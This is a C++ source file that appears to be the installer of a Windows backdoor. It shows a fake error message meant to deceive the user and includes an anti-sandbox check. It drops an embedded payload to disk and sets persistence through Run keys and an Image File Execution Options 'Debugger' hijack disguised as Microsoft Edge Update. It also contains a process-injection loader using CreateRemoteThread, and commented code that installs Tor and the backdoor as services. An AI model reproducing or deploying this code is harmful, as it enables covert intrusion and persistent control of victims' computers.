                    //printf("the accesstoken SID => %S\n", WStringSid);
                }
                LocalFree(pTIL);
            }

            if (pTIL == NULL) { return L""; }
        }
    }

    if (WStringSid == NULL) { return L""; }

    return WStringSid;
}

bool setRegValue(std::wstring regPath, std::string agentName, std::string agentPath) {
    NTSTATUS status;

    ///////////OPENING THE KEY
    HANDLE hkey;
    ULONG dispos = 0;
    OBJECT_ATTRIBUTES attr;

    std::wstring wsPath = regPath;
    UNICODE_STRING nameW{};
    nameW.Length = (wsPath.size() * 2);
    nameW.MaximumLength = (wsPath.size() * 2);
    nameW.Buffer = wsPath.data();

    attr.Length = sizeof(attr);
    attr.RootDirectory = 0;
    attr.ObjectName = &nameW;
    attr.Attributes = 0;
    attr.SecurityDescriptor = NULL;
    attr.SecurityQualityOfService = NULL;

    status = NtOpenKey(&hkey, KEY_WRITE, &attr);
    if (!ntStatusCheck(status, "NtOpenKey Err")) { return false; }

    if (dispos == REG_OPENED_EXISTING_KEY) {
        printf("already exists\n");
        return dispos; /* someone else already loaded the registry */
    }

    if (hkey == NULL) {
        printf("key handle is NULL\n");
    }

    ///////////SETTING VALUE KEY
    //value namer
    std::wstring wsAgentName = std::wstring(agentName.begin(), agentName.end());
    UNICODE_STRING valueNameUSTR{};
    valueNameUSTR.Length = (wsAgentName.size() * 2);
    valueNameUSTR.MaximumLength = (wsAgentName.size() * 2);
    valueNameUSTR.Buffer = wsAgentName.data();

    //value data
    wchar_t wsAgentPath[1024];
    mbstowcs(wsAgentPath, agentPath.c_str(), agentPath.size());
    status = NtSetValueKey(hkey, (PUNICODE_STRING)&valueNameUSTR, 0, REG_SZ, (PVOID)&wsAgentPath, agentPath.size()*2);
    if (!ntStatusCheck(status, "NtSetValueKey Err")) { return false; }
    std::cout << "errcode: " << status << "\n";
    NtClose(hkey);

    return true;
}

char* readFile(std::string path, size_t &filesizeIN) {
    //SHARED STUFF
    NTSTATUS status = 0;

    UNICODE_STRING pathObjName{};
    //
    OBJECT_ATTRIBUTES objAttr{};
    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
    objAttr.RootDirectory = 0;
    objAttr.Attributes = 0;
    objAttr.SecurityDescriptor = 0;//optional
    objAttr.SecurityQualityOfService = 0;


    //OPEN FILE NATIVE API
    /*
    std::wstring path2(src.begin(), src.end());
    pathObjName.Length = path2.size()*2;
    pathObjName.MaximumLength = path2.size()*2;
    pathObjName.Buffer = path2.data();
    //
    objAttr.ObjectName = &pathObjName;
    //
    IO_STATUS_BLOCK isb{};
    HANDLE fileHandle2{};
    //status = NtOpenFile(&fileHandle2, 2032127, &objAttr, &isb, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0x20);
    status = NtOpenFile(&fileHandle2, FILE_READ_DATA, &objAttr, &isb, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0);
    ntStatusCheck(status, "NtOpenFile Err");

    printf("status block NtOpenFile: %#x\n", isb.Information);
    */

    //LPOFSTRUCT lpOStruct = nullptr;
    //HFILE fileHandle0 = OpenFile("C:\\Users\\venego\\Desktop\\SilentLoader.exe", lpOStruct, OF_READWRITE);
    std::wstring srcPath(path.begin(), path.end());
    HANDLE fileHandle2 = CreateFileW(
        srcPath.c_str(),     // Filename
        GENERIC_READ,           // Desired access
        FILE_SHARE_READ,        // Share mode
        NULL,                   // Security attributes
        OPEN_EXISTING,          // open if only file exists
        FILE_ATTRIBUTE_NORMAL,  // Flags and attributes
        NULL);


    //printf("err code OpenFile: %#x\n", lpOStruct->nErrCode);

    //GET FILE SIZE
    //FILE_STREAM_INFO fsi = { 0 };
    FILE_STANDARD_INFORMATION fsi = { 0 };
    IO_STATUS_BLOCK io = { 0 };
    status = NtQueryInformationFile(fileHandle2, &io, (PVOID)&fsi, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
    ntStatusCheck(status, "NtQueryInformationFile  Err");

    //printf("status block NtQueryInformationFile: %#x\n", io.Information);

    //READ FILE
    size_t filesize = fsi.EndOfFile.QuadPart;
    filesizeIN = filesize;
    //std::cout << "fiel size: " << filesize;
    //getchar();
    char* buffer = new char[filesize];
    IO_STATUS_BLOCK isb2{};
    status = NtReadFile(fileHandle2, 0, 0, 0, &isb2, buffer, (ULONG)filesize, 0, 0);
    ntStatusCheck(status, "NtReadFile Err");
    NtClose(fileHandle2);

    return buffer;
}

bool writeFile(std::string path, char* buffer, size_t buffSize) {
    //SHARED STUFF
    NTSTATUS status = 0;

    UNICODE_STRING pathObjName{};
    //
    OBJECT_ATTRIBUTES objAttr{};
    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
    objAttr.RootDirectory = 0;
    objAttr.Attributes = 0;
    objAttr.SecurityDescriptor = 0;//optional
    objAttr.SecurityQualityOfService = 0;

    IO_STATUS_BLOCK io = { 0 };



    /////////CREATE FILE
    std::wstring path3(path.begin(), path.end());
    pathObjName.Length = path3.size() * 2;
    pathObjName.MaximumLength = path3.size() * 2;
    pathObjName.Buffer = path3.data();
    //
    objAttr.ObjectName = &pathObjName;


    HANDLE fileHandle{};
    status = NtCreateFile(&fileHandle, 2032127, &objAttr, &io, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, 0, 0x20, NULL, 0);
    ntStatusCheck(status, "NtCreateFile Err");

    status = NtWriteFile(fileHandle, 0, 0, 0, &io, (PVOID)buffer, (ULONG)buffSize, 0, 0);
    ntStatusCheck(status, "NtWriteFile Err");
    NtClose(fileHandle);

    return true;
}

void copyItSelf(std::string src, std::string dest, std::string destFolder) {

    if (!CreateDirectoryA(destFolder.c_str(), nullptr)) {
        std::cout << "can't create DIR\n";
    }
    //CREATE DIR NATIVE API
    /*
    HANDLE dirHandle = NULL;
    status = NtCreateDirectoryObject(&dirHandle, MAXIMUM_ALLOWED, &objAttr);
    ntStatusCheck(status, "NtCreateDirectoryObject Err");
    */

    size_t filesize = 0;
    char* buffer = readFile(src, filesize);

    writeFile(dest, buffer, filesize);
    
}

std::string getCurrentPath() {
    char buf[MAX_PATH];
    GetModuleFileNameExA(GetCurrentProcess(), 0, (LPSTR)&buf, MAX_PATH);
    //GetModuleFileNameW(0, (LPWSTR)buf, MAX_PATH);

    return std::string(buf);
}

bool isInjected() {

    std::string currentPath = getCurrentPath();
    std::string targetProcName = Settings::targetProcName;

    std::cout << "current path: " << currentPath << "\n";
    std::cout << "injection path: " << targetProcName << "\n";
    
    if (currentPath.find(targetProcName) != std::string::npos) {
        return true;//injected
    }

    return false;
}

char* parsePEbuffer(std::string PE2Load, size_t &sizeOUT) {
    
    if (PE2Load.find("resource") != std::string::npos) {

        std::string result;
        size_t exeSiz = 0;
        HGLOBAL hGlobal;
        unsigned char* exeBuf = NULL;
        char* dataptr = NULL;

        HRSRC hResource = NULL;
        hResource = FindResource(NULL, MAKEINTRESOURCE(IDR_TEXT1), TEXT("TEXT"));
        
        if (hResource != NULL) {
            hGlobal = LoadResource(NULL, hResource);
            if (hGlobal != NULL) {
                sizeOUT = SizeofResource(NULL, hResource); // Size of the embedded data
                dataptr = (char*)LockResource(hGlobal);   // usable pointer to that data
                //result.assign(dataptr, exeSiz);
            }
        }

        return dataptr;

    }
    //else
    /*
    else{
        std::string PEsrc;
        if (PE2Load == "self") {
            PEsrc = getCurrentPath();
        }else {
            PEsrc = PE2Load;
        }

        std::wstring srcPath(PEsrc.begin(), PEsrc.end());
        HANDLE fileHandle2 = CreateFileW(
            srcPath.c_str(),     // Filename
            GENERIC_READ,           // Desired access
            FILE_SHARE_READ,        // Share mode
            NULL,                   // Security attributes
            OPEN_EXISTING,          // open if only file exists
            FILE_ATTRIBUTE_NORMAL,  // Flags and attributes
            NULL);


        //printf("err code OpenFile: %#x\n", lpOStruct->nErrCode);

        //GET FILE SIZE
        //FILE_STREAM_INFO fsi = { 0 };
        FILE_STANDARD_INFORMATION fsi = { 0 };
        IO_STATUS_BLOCK io = { 0 };
        NTSTATUS status = NtQueryInformationFile(fileHandle2, &io, (PVOID)&fsi, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
        ntStatusCheck(status, "NtQueryInformationFile  Err");

        //printf("status block NtQueryInformationFile: %#x\n", io.Information);

        //READ FILE
        size_t filesize = fsi.EndOfFile.QuadPart;
        //std::cout << "fiel size: " << filesize;
        //getchar();
        char* buffer = new char[filesize];
        IO_STATUS_BLOCK isb2{};
        status = NtReadFile(fileHandle2, 0, 0, 0, &isb2, buffer, (ULONG)filesize, 0, 0);
        ntStatusCheck(status, "NtReadFile Err");
        NtClose(fileHandle2);

        return buffer;
    }
    */

    return NULL;

}

void* load_PE(char* PE_data, std::string targetProc) {

    /** Parse header **/

    IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*)PE_data;
    IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*)(((char*)p_DOS_HDR) + p_DOS_HDR->e_lfanew);

    // Validte PE Infromation
    bool isPE = p_DOS_HDR->e_magic == IMAGE_DOS_SIGNATURE;
    if (!isPE)
    {
        printf("[Error] Input PE file is invalid. (Signature Mismatch)\n");
        return NULL;
    }

    //The magic number for the image pe format is 0x10b for PE32 and 0x20b for PE32 +
#if defined (_WIN64)
    bool is64 = p_NT_HDR->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 && p_NT_HDR->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC;
    if (!is64)
    {
        printf("[Error] This file is not x64.\n");
        return NULL;
    }
#elif (_WIN32)
    bool is32 = p_NT_HDR->FileHeader.Machine == IMAGE_FILE_MACHINE_I386 && p_NT_HDR->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC;
    if (!is32)
    {
        printf("[Error] This file is not x86.\n");
        return NULL;
    }
#endif


    char* hdr_image_base = (char*)p_NT_HDR->OptionalHeader.ImageBase;
    DWORD size_of_image = p_NT_HDR->OptionalHeader.SizeOfImage;
    DWORD entry_point_RVA = p_NT_HDR->OptionalHeader.AddressOfEntryPoint;
    DWORD size_of_headers = p_NT_HDR->OptionalHeader.SizeOfHeaders;

    /** Allocate Memory **/
    char* ImageBase = NULL;
    PSIZE_T imageSize_T = (PSIZE_T)size_of_image;
    PVOID ImageBasePVOID = hdr_image_base;

    //PULONG ProcNumNT = NULL;
    //NtGetCurrentProcessorNumberEx((PULONG)&ProcNumNT);
    HANDLE ProcNumNTHandle = GetCurrentProcess();

    NTSTATUS statusNTAlloc = NtAllocateVirtualMemory((HANDLE)ProcNumNTHandle, &ImageBasePVOID, 0, (PSIZE_T)&imageSize_T, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    ImageBase = (char*)ImageBasePVOID;

    if (statusNTAlloc != 0) {
        ImageBasePVOID = NULL;
        statusNTAlloc = NtAllocateVirtualMemory((HANDLE)ProcNumNTHandle, &ImageBasePVOID, 0, (PSIZE_T)&size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        ImageBase = (char*)ImageBasePVOID;

        ntStatusCheck(statusNTAlloc, "NtAllocateVirtualMemory err:");
        if (statusNTAlloc != 0) {
            //GetLastErrorAsString();
            /*
            ImageBase = (char*)VirtualAlloc(hdr_image_base, size_of_image, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
            if (ImageBase == NULL) {
                ImageBase = (char*)VirtualAlloc(NULL, size_of_image, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
                if (ImageBase == NULL) { return NULL; }
            }
            */
        }
    }

    /** Map PE sections in memory **/

    memcpy(ImageBase, PE_data, p_NT_HDR->OptionalHeader.SizeOfHeaders);


    // Section headers starts right after the IMAGE_NT_HEADERS struct, so we do some pointer arithmetic-fu here.
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)(p_NT_HDR + 1);

    // For each sections
    for (int i = 0; i < p_NT_HDR->FileHeader.NumberOfSections; ++i) {
        // calculate the VA we need to copy the content, from the RVA 
        // section[i].VirtualAddress is a RVA, mind it
        char* dest = ImageBase + sections[i].VirtualAddress;

        // check if there is Raw data to copy
        if (sections[i].SizeOfRawData > 0) {
            // We copy SizeOfRaw data bytes, from the offset PointertoRawData in the file
            memcpy(dest, PE_data + sections[i].PointerToRawData, sections[i].SizeOfRawData);
        }
        else {
            memset(dest, 0, sections[i].Misc.VirtualSize);
        }
    }

    IMAGE_DATA_DIRECTORY* data_directory = p_NT_HDR->OptionalHeader.DataDirectory;
    
    /** Handle imports **/

    // load the address of the import descriptors array
    IMAGE_IMPORT_DESCRIPTOR* import_descriptors = (IMAGE_IMPORT_DESCRIPTOR*)(ImageBase + data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    // this array is null terminated
    for (int i = 0; import_descriptors[i].OriginalFirstThunk != 0; ++i) {

        // Get the name of the dll, and import it
        char* module_name = ImageBase + import_descriptors[i].Name;
        printf("\n[*__*] adding functions from Module: %s\n", module_name);
        HMODULE import_module = LoadLibraryA(module_name);
        if (import_module == NULL) {
            printf("[*] import module err ------------------------------------------------\n");
            return NULL;
        }

        // the lookup table points to function names or ordinals => it is the INT
        IMAGE_THUNK_DATA* lookup_table = (IMAGE_THUNK_DATA*)(ImageBase + import_descriptors[i].OriginalFirstThunk);

        // the address table is a copy of the lookup table at first
        // but we put the addresses of the loaded function inside => that's the IAT
        IMAGE_THUNK_DATA* address_table = (IMAGE_THUNK_DATA*)(ImageBase + import_descriptors[i].FirstThunk);

        // null terminated array, again
        for (int i = 0; lookup_table[i].u1.AddressOfData != 0; ++i) {
            void* function_handle = NULL;

            // Check the lookup table for the adresse of the function name to import
            unsigned long long lookup_addr = lookup_table[i].u1.AddressOfData;

            if ((lookup_addr & IMAGE_ORDINAL_FLAG) == 0) { //if first bit is not 1
                // import by name : get the IMAGE_IMPORT_BY_NAME struct
                IMAGE_IMPORT_BY_NAME* image_import = (IMAGE_IMPORT_BY_NAME*)(ImageBase + lookup_addr);
                // this struct points to the ASCII function name
                char* funct_name = (char*)&(image_import->Name);
                printf("[*] adding address of: %s -- byName\n", funct_name);
                // get that function address from it's module and name
                function_handle = (void*)GetProcAddress(import_module, funct_name);
            }
            //ordinal of 64bit
            else if (lookup_table[i].u1.Ordinal && IMAGE_ORDINAL_FLAG64) {
                //You have some difference in the import table when you look for name or ordinal in import functions bit is masked as 0x80000000 for PE32, 0x8000000000000000 for PE32+
                printf("[*] missing with the bits--------------------------------------\n");
                printf("[*] adding address by ordinal64------------------------------------------\n");
                lookup_addr &= 0x000000000000ffff;

                function_handle = (void*)GetProcAddress(import_module, (LPCSTR)lookup_addr);
            }
            //ordinal of 32bit
            else {
                printf("[*] missing with the bits--------------------------------------\n");
                printf("[*] adding address by ordinal32--------------------------------------\n");
                // import by ordinal, directly
                //lookup_addr &= 0x0000ffff; //setting the high part to ZERO
                lookup_addr &= 0x000000000000ffff; //setting the high part to ZERO
                function_handle = (void*)GetProcAddress(import_module, (LPCSTR)lookup_addr);
            }

            if (function_handle == NULL) { 
                printf("[*] function handle  err ------------------------------------------------\n"); 
                return NULL; 
            }

            // change the IAT, and put the function address inside.
            address_table[i].u1.Function = reinterpret_cast<DWORD_PTR>(function_handle);
        }

        printf("[*] out of DLL\n");
    }

    //////TODO
    //get process list
    /*
    HANDLE targetProcess = NULL;

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            std::wstring fileNameWS = entry.szExeFile;
            if (fileNameWS == std::wstring(L"explorer.exe"))
            {
                printf("exlporer.exe PID: %d\n", entry.th32ProcessID);
                targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
            }
        }
    }
    CloseHandle(snapshot);
    */

    HANDLE targetProcess = NULL;
    
    if (targetProc != "self") {

        char procFileNameBuf[MAX_PATH];
        //get explorer handle
        while (true) {
            NtGetNextProcess(targetProcess, MAXIMUM_ALLOWED, 0, 0, &targetProcess);

            if (targetProcess == NULL) break;

            /*
            UNICODE_STRING procFileNameUS;
            procFileNameUS.Buffer = NULL;
            procFileNameUS.Length = 0x0;
            procFileNameUS.MaximumLength = sizeof(UNICODE_STRING);
            NtQueryInformationProcess(targetProcess, ProcessImageFileName, &procFileNameUS, sizeof(UNICODE_STRING), NULL);
            std::cout << "unicode string buffer: " << procFileNameUS.Buffer;
            getchar();
            */

            GetModuleFileNameExA(targetProcess, 0, (LPSTR)&procFileNameBuf, MAX_PATH);
            std::string procFileNameStr = procFileNameBuf;
            size_t found = procFileNameStr.find(targetProc, 0);
            if (found != std::string::npos) {
                //printf("process handle: %d\n", targetProcess);
                //std::cout << "process file name: " << procFileNameStr << "\n";
                break;
            }
        }
    }
    else {
        targetProcess = GetCurrentProcess();
    }
    

    PVOID RemoteImageBase = hdr_image_base;
    statusNTAlloc = NtAllocateVirtualMemory((HANDLE)targetProcess, &RemoteImageBase, 0, (PSIZE_T)&imageSize_T, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    ImageBase = (char*)ImageBasePVOID;

    if (statusNTAlloc != 0) {
        ImageBasePVOID = NULL;
        statusNTAlloc = NtAllocateVirtualMemory((HANDLE)targetProcess, &RemoteImageBase, 0, (PSIZE_T)&size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        ntStatusCheck(statusNTAlloc, "NtAllocateVirtualMemory Remote err:");
        ImageBase = (char*)ImageBasePVOID;

        if (statusNTAlloc != 0) {
            printf("err code %x --", (void*)statusNTAlloc);
            exit(0);
        }
    }

    NtWriteVirtualMemory(targetProcess, RemoteImageBase, (PVOID)ImageBasePVOID, (SIZE_T)imageSize_T, NULL);
    //WriteProcessMemory(targetProcess, RemoteImageBase, (PVOID)ImageBasePVOID, (SIZE_T)imageSize_T, NULL);
    char* RemoteImageBaseChar = (char*)RemoteImageBase;


    /** Handle relocations **/

    //this is how much we shifted the ImageBase
    DWORD_PTR delta_VA_reloc = (reinterpret_cast<DWORD_PTR>(RemoteImageBase)) - p_NT_HDR->OptionalHeader.ImageBase;

    // if there is a relocation table, and we actually shitfted the ImageBase
    if (data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0 && delta_VA_reloc != 0) {
        //printf("\n[*] The allocated address is not the prefered address, started relocating\n");
        //calculate the relocation table address
        IMAGE_BASE_RELOCATION* p_reloc = (IMAGE_BASE_RELOCATION*)(RemoteImageBaseChar + data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

        //once again, a null terminated array
        while (p_reloc->VirtualAddress != 0) {
            // how many relocations in this block
            // ie the total size, minus the size of the "header", divided by 2 (those are words, so 2 bytes for each)
            //std::cout << sizeof(WORD) << "\n"; sizeof word is 2
            DWORD size = (p_reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

            // the first relocation element in the block, right after the header (using pointer arithmetic again)
            WORD* reloc = (WORD*)(p_reloc + 1);
            for (int i = 0; i < size; ++i) {
                //type is the first 4 bits of the relocation word
                int type = reloc[i] >> 12;

                // offset is the last 12 bits
                int offset = reloc[i] & 0x0fff;

                //this is the address we are going to change
                //DWORD* is enough in only 32
                unsigned long long int* change_addr = (unsigned long long int*)(RemoteImageBaseChar + p_reloc->VirtualAddress + offset);

                // there is only one type used that needs to make a change
                switch (type) {
#if defined (_WIN64)
                case IMAGE_REL_BASED_DIR64://for x64
                    *change_addr += delta_VA_reloc;
                    break;
#elif(_WIN32)
                case IMAGE_REL_BASED_HIGHLOW://for x86
                    *change_addr += delta_VA_reloc;
                    break;
#endif
                default:
                    break;
                }
            }

            // switch to the next relocation block, based on the size
            p_reloc = (IMAGE_BASE_RELOCATION*)((reinterpret_cast<DWORD_PTR>(p_reloc)) + p_reloc->SizeOfBlock);
        }
    }


    /** Map PE sections privileges **/
    //Set permission for the PE hader to read only

    ULONG OldProtec = NULL;
    SIZE_T SizeOfHeadersNT = (SIZE_T)p_NT_HDR->OptionalHeader.SizeOfHeaders;
    NTSTATUS NTStatusMemProtect = NtProtectVirtualMemory(targetProcess, &RemoteImageBase, &SizeOfHeadersNT, PAGE_READONLY, &OldProtec);
    ntStatusCheck(statusNTAlloc, "NtProtectVirtualMemory Remote err:");

    //DWORD oldProtect;
    //VirtualProtect(ImageBase, p_NT_HDR->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProtect);

    for (int i = 0; i < p_NT_HDR->FileHeader.NumberOfSections; ++i) {
        char* dest = RemoteImageBaseChar + sections[i].VirtualAddress;
        DWORD s_perm = sections[i].Characteristics;
        DWORD v_perm = 0; //flags are not the same between virtal protect and the section header
        if (s_perm & IMAGE_SCN_MEM_EXECUTE) {v_perm = (s_perm & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;}
        else {v_perm = (s_perm & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;}

        SizeOfHeadersNT = (SIZE_T)sections[i].Misc.VirtualSize;
        PVOID basePlsSection = dest;
        NTStatusMemProtect = NtProtectVirtualMemory(targetProcess, &basePlsSection, &SizeOfHeadersNT, v_perm, &OldProtec);
        ntStatusCheck(statusNTAlloc, "NtProtectVirtualMemory Remote err:");
        if (NTStatusMemProtect != 0) {
            printf("err code %x --", (void*)NTStatusMemProtect);
            std::cout << "NT memprotect failed\n";
        }
        //VirtualProtect(dest, sections[i].Misc.VirtualSize, v_perm, &oldProtect);
    }

    printf("\n[+] reserved Address: %#llx", RemoteImageBaseChar);
    printf("\n[+] Image Raw Size: %llx\n", size_of_image);

    DWORD ThreadId = NULL;
    CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)(RemoteImageBaseChar + entry_point_RVA) + delta_VA_reloc), NULL, 0, (PDWORD)&ThreadId);

    //HANDLE threadHandle = NULL;
    //NtCreateThreadEx((PHANDLE)&threadHandle, MAXIMUM_ALLOWED, );

    CloseHandle(targetProcess);

    std::cout << "the thread ID is: " << ThreadId;
    //return (void*)(RemoteImageBaseChar + entry_point_RVA);
    
    return nullptr;
}

bool setGlobalVars() {

    // setting startup
    std::string fileName = Settings::InstallExeName;
    std::string directory = Settings::InstallDirName;

    //install path
    std::string InstallDirPath;
    std::string InstallPath;

    char* InstallPathBuf = 0;
    size_t sz = 0;
    if (_dupenv_s(&InstallPathBuf, &sz, Settings::InstallEnvPath.c_str()) == 0)
    {
        if (InstallPathBuf != NULL)
        {
            InstallDirPath = std::string(InstallPathBuf) + Settings::InstallEnvChildPath + directory;
            InstallPath = InstallDirPath + "\\" + fileName;
            free(InstallPathBuf);
        }
    }

    std::string src = getCurrentPath();
    Settings::currentExePath = src;
    Settings::installDirPath = InstallDirPath;
    Settings::installExePath = InstallPath;
    
    //privs
    Settings::isPrivleged = amIPrivleged();


    //get registry MACHINE startup path
    //Settings::regMachineStartupPath = L"\\Registry\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    //Settings::regMachineRunOncePath = L"\\Registry\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce";
    

    std::wstring userSID = getUserSID();
    //get registry USER startup path
    wchar_t path1[] = L"\\Registry\\USER\\";
    wchar_t path2[] = L"\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    if (userSID != L"") {
        Settings::regUserStartupPath = path1 + std::wstring(userSID) + path2;
    }
    //get registry USER RunOnce path
    //wchar_t path1RO[] = L"\\Registry\\USER\\";
    //wchar_t path2RO[] = L"\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce";
    //if (userSID != L"") {
    //    Settings::regUserRunOncePath = path1RO + std::wstring(userSID) + path2RO;
    //}

    return true;
}

bool isStartupSet() {
    //INSTALLATION
    if (!std::filesystem::exists(Settings::installExePath)) { return false; }
    //std::cout << "---------------install exe path: " << Settings::installExePath;
    //STARTUP
    //does the userstartup key exist?
    int status = 0;
    status = isRegValueSet(Settings::regUserStartupPath, Settings::startupName);
    
    //if (status == -1) { std::cout << "Err getting reg startup value\n"; return false; }
    if (status != 1) { 
        //image file execution startup
        status = isRegValueSet(Settings::regUserStartupPath, "Microsoft Updates");
        if (status != 1) { return false; }

        std::wstring regFExecPath = Settings::regFileOptExecStartupPath + L"MicrosoftEdgeUpdate.exe";
        status = isRegValueSet(regFExecPath, "Debugger");
        if (status != 1) { return false; }
    }
    
    return true;
}

VOID SvcInstall(LPCSTR serviceName, LPCSTR servicePath)
{
    SC_HANDLE schSCManager;
    SC_HANDLE schService;

    // Get a handle to the SCM database. 

    schSCManager = OpenSCManager(
        NULL,                    // local computer
        NULL,                    // ServicesActive database 
        SC_MANAGER_ALL_ACCESS);  // full access rights 

    if (NULL == schSCManager)
    {
        printf("failed Man(%d)\n", GetLastError());
        return;
    }

    // Create the service

    schService = CreateServiceA(
        schSCManager,              // SCM database 
        serviceName,                   // name of service 
        serviceName,                   // service name to display 
        SERVICE_ALL_ACCESS,        // desired access 
        SERVICE_WIN32_OWN_PROCESS, // service type 
        SERVICE_AUTO_START,      // start type 
        SERVICE_ERROR_NORMAL,      // error control type 
        servicePath,                    // path to service's binary 
        NULL,                      // no load ordering group 
        NULL,                      // no tag identifier 
        NULL,                      // no dependencies 
        NULL,                      // LocalSystem account 
        NULL);                     // no password 

    if (schService == NULL)
    {
        printf("failed (%d)\n", GetLastError());
        CloseServiceHandle(schSCManager);
        return;
    }
    else printf("successfully\n");

    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
}

bool setStartup(bool askForPrivs=true) {
    std::string pathPrefix = "\\??\\";


    if (Settings::isPrivleged) {

        /*
        //tor proxy
        std::string proxPath = Settings::installDirPath + "\\tor\\Tor\\tor.exe";
        SvcInstall("syshelp-win32-service", proxPath.c_str());

        //the backdoor
        std::string backDPath = Settings::installDirPath + "\\" + Settings::InstallExeName;
        SvcInstall("syshelpwin-win32-service", backDPath.c_str());
        */


        //image file execution startup
        setRegValue(Settings::regUserStartupPath, "Microsoft Updates", "C:\\Program Files(x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe");//decoy
        //setRegValue(Settings::regUserStartupPath, "wsappsx service", "cmd /c start /min \"" + Settings::installDirPath + "\\tor\\tor\\tor.exe\""); //tor runner
        //setRegValue(Settings::regUserStartupPath, "wsappsx service", Settings::installDirPath + "\\wsappsx.exe"); //tor runner

        std::wstring regFExecPath = Settings::regFileOptExecStartupPath + L"MicrosoftEdgeUpdate.exe";
        setRegValue(regFExecPath, "Debugger", Settings::installExePath);
        
    }
    else {

        if(askForPrivs){askForPriv();}

        //reg startup
        setRegValue(Settings::regUserStartupPath, Settings::startupName, Settings::installExePath); //the agent
        //setRegValue(Settings::regUserStartupPath, "wsappsx service", "cmd /c start /min \""+Settings::installDirPath+"\\tor\\tor\\tor.exe\""); //tor runner
        //setRegValue(Settings::regUserStartupPath, "wsappsx service", Settings::installDirPath+"\\wsappsx.exe"); //tor runner
    }

    return true;
}

void getInstallDate() {
    SYSTEMTIME systemTime;
    GetSystemTime((LPSYSTEMTIME)&systemTime);

    systemTime.wHour = 5;

    SYSTEMTIME systemTimeOLD;
    NTSTATUS status = NtSetSystemTime((PLARGE_INTEGER)&systemTime, (PLARGE_INTEGER)&systemTimeOLD);
    ntStatusCheck(status, "NtSetSystemTime Remote err:");

}

void messageBoxTh(std::string msg, std::string title){MessageBoxA(0, msg.c_str(), title.c_str(), MB_OK);}
void showMessageBox(std::string msg, std::string title){std::thread msgBoxTh(messageBoxTh, msg, title);msgBoxTh.join();}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)	//main function
//int main(int argc, char* argv[])
{

    //throw off the user first
    //showMessageBox("This Archetecture might not be supported.", "ERROR 0x00000057");
    showMessageBox("This Archetecture is not supported. \nError Code: (0x00000057).", "ERROR 0x00000057");
    
    checker();//checks for sleep() bypass and wait for 10 mouse clicks

    //sets current Exe path, install Dir, install ExePath, privleges
    setGlobalVars();

    if (!isStartupSet()) {

        if (!isInjected()) {
            //set installation
            std::string InstallPath = "\\??\\" + Settings::installExePath;
            //copyItSelf(Settings::currentExePath, InstallPath, Settings::installDirPath);

            CreateDirectoryA(Settings::installDirPath.c_str(), nullptr);
            size_t sizeOut = 0;

            //load the client resource
            char* exe_file_data = parsePEbuffer("resource1", sizeOut);
            writeFile(InstallPath, exe_file_data, sizeOut);
            //load the tor runner resource
            // exe_file_data = parsePEbuffer("resource2", sizeOut);
            // writeFile("\\??\\"+ Settings::installDirPath+"\\wsappsx.exe", exe_file_data, sizeOut);

            /*
            if (Settings::isPrivleged == false) {
                size_t dummy = 0;
                char* exe_file_data = parsePEbuffer(Settings::PEToLoad, dummy);
                //if not "self" then inject in name_proc
                void* start_address = load_PE(exe_file_data, Settings::targetProcName);
                exit(0);
            }
            */
        }

        setStartup(false);//ask for privs = true by default

        //showMessageBox("This Archetecture is not supported. \nError Code: (0x00000057).", "ERROR 0x00000057");
        //while (true) { Sleep(99999999); }//to not get explorer restarted
        return 0;
    }
    
    return 0;
}